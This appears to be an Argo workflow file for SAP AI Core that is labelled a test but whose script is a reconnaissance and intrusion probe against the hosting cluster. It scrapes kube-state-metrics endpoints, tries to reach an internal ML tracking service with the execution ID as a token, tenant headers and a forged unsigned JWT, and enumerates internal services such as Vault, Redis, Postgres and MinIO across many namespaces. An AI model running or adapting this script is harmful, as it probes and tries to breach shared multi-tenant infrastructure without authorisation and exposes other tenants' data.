apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-exec
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-exec"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-exec"
    ai.sap.com/version: "17.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        echo "=== V17 KSM + ML-TRACKING PROBE ==="
        
        # === KUBE-STATE-METRICS (KSM) - THE P1 FINDING ===
        echo "=== KSM PROBES ==="
        
        # Known KSM endpoints from prior runs
        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.opentelemetry.svc.cluster.local:8080"           "kube-state-metrics.monitoring.svc.cluster.local:8080"           "kube-state-metrics.kube-system.svc.cluster.local:8080"; do
          echo "--- KSM: $ksm_host ---"
          RESP=$(curl -s --connect-timeout 5 "http://${ksm_host}/metrics" 2>&1 | head -c 3000)
          BYTES=$(echo "$RESP" | wc -c)
          echo "BYTES=$BYTES"
          echo "$RESP" | head -30
          echo "..."
          echo ""
        done
        
        # === KSM via direct IP (bypass DNS) ===
        echo "=== KSM DIRECT IP ==="
        # Resolve KSM DNS
        for ksm_host in           "ksm-pods-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local"           "ksm-multi-kube-state-metrics.opentelemetry.svc.cluster.local"; do
          IP=$(dig +short "$ksm_host" 2>/dev/null | head -1)
          echo "DNS: $ksm_host = ${IP:-NXDOMAIN}"
          if [ -n "$IP" ]; then
            RESP=$(curl -s --connect-timeout 5 "http://${IP}:8080/metrics" 2>&1 | wc -c)
            echo "  Direct IP: $RESP bytes"
          fi
        done
        
        # === ML TRACKING SERVICE ===
        echo "=== ML TRACKING ==="
        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
        
        # Try with execution ID as bearer token
        echo "--- With execution ID as token ---"
        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer $AICORE_EXECUTION_ID" 2>&1 | head -c 300
        echo ""
        
        # Try with tenant ID
        echo "--- With tenant header ---"
        curl -s --connect-timeout 5 "$TRACK/" -H "AI-Main-Tenant: $AI_MAIN_TENANT" -H "AI-Resource-Group: $AI_RESOURCE_GROUP" 2>&1 | head -c 300
        echo ""
        
        # Try with a fabricated JWT-looking token
        echo "--- With fake JWT ---"
        curl -s --connect-timeout 5 "$TRACK/" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJ0ZXN0In0." 2>&1 | head -c 300
        echo ""
        
        # Try without auth (different paths)
        echo "--- No auth paths ---"
        for path in "/health" "/healthz" "/ready" "/readyz" "/metrics" "/swagger" "/api-docs" "/openapi.json" "/api/v1" "/api/v1/info" "/api/v1/health"; do
          RESP=$(curl -s --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
          [ -n "$RESP" ] && echo "  ${path}: ${RESP}"
        done
        
        # === PROMETHEUS / GRAFANA DISCOVERY ===
        echo "=== PROMETHEUS/GRAFANA ==="
        for svc in prometheus-server prometheus grafana; do
          for ns in monitoring opentelemetry platform-tests kube-system; do
            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
            [ -n "$IP" ] && {
              echo "FOUND: ${svc}.${ns} = $IP"
              curl -s --connect-timeout 3 "http://${IP}:9090/-/healthy" 2>&1 | head -c 200
              curl -s --connect-timeout 3 "http://${IP}:3000/api/health" 2>&1 | head -c 200
              echo ""
            }
          done
        done
        
        # === OPENTELEMETRY SERVICES ===
        echo "=== OPENTELEMETRY NS ==="
        for svc in otel-collector jaeger zipkin fluentbit fluent-bit; do
          IP=$(dig +short "${svc}.opentelemetry.svc.cluster.local" 2>/dev/null | head -1)
          [ -n "$IP" ] && echo "FOUND: ${svc}.opentelemetry = $IP"
        done
        
        # === BROADER DNS ENUM ===
        echo "=== EXPANDED DNS ==="
        for svc in           "redis-master" "redis" "postgresql" "postgres" "mongodb" "mongo"           "elasticsearch" "es" "kibana" "logstash"           "vault" "consul" "minio" "s3"           "istio-ingressgateway" "istiod"           "nginx-ingress-controller" "traefik"           "aicore-server" "ai-launchpad" "user-management"; do
          for ns in default istio-system istio-networking kube-system aicore argo cert-manager couchdb endpoint-service platform-tests connectivity-proxy user-management not-diamond fluent-bit; do
            IP=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
            [ -n "$IP" ] && echo "FOUND: ${svc}.${ns} = $IP"
          done
        done
        
        echo "=== V17 COMPLETE ==="
